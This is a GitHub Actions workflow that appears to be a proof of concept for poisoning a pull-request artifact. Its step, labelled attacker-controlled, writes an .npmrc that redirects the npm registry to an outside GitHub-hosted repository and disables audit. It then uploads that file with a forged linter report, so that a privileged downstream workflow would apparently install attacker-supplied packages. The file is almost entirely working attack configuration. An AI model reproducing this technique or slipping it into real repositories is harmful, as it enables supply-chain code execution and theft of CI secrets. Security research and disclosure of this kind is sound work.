name: ADP PR Lint
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  forged-lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged linter artifact (attacker controlled)
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          mkdir -p /tmp/root
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg2/\naudit=false\nfund=false\nprogress=false\n' > /tmp/root/.npmrc
          echo "$PR_NUMBER" > /tmp/root/pr-number.txt
          echo "forged report from PR head" > /tmp/root/linter-report.txt
          ls -la /tmp/root
      - uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            /tmp/root/.npmrc
            /tmp/root/pr-number.txt
            /tmp/root/linter-report.txt
          include-hidden-files: true
          if-no-files-found: ignore
